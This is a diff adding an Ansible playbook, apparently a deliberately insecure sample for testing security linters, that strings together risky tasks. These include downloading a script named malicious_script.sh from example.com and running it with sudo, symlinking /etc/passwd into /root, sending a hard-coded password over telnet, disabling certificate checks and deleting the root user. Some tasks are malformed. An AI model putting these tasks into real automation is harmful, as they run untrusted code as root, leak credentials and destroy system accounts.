@@ -1,0 +1,48 @@
+
+- name: Ansible Security Issue Playbook
+  hosts: all
+  tasks:
+    - name: Check if 'unsafe' mode is enabled
+      command: echo 'Unsafe mode is enabled'
+      when: ansible_allow_world_readable_tmpfiles
+
+    - name: Create a symlink to the root directory
+      file:
+        src: /etc/passwd
+        dest: /root/passwd
+        state: link
+
+    - name: Download and execute a script with sudo
+      get_url:
+        url: https://example.com/malicious_script.sh
+        dest: /tmp/malicious_script.sh
+      command: sudo bash /tmp/malicious_script.sh
+
+    - name: Attempt to execute a command with invalid syntax
+      command: 'cat /etc/passwd | | grep root'
+
+    - name: Send a password in the clear to an insecure service
+      expect:
+        command: telnet example.com 23
+        responses:
+          password: password123
+
+    - name: Create a large file on disk with random contents
+      shell: dd if=/dev/urandom of=/tmp/bigfile bs=1M count=100
+
+    - name: Attempt an HTTP request with invalid SSL certificates
+      uri:
+        url: https://example.com
+        validate_certs: no
+
+    - name: Execute a command as root without privilege escalation
+      command: touch /root/testfile
+
+    - name: Delete the root user
+      user:
+        name: root
+        state: absent
+
+    - name: Pause the playbook for 30 seconds
+      pause:
+        seconds: 30
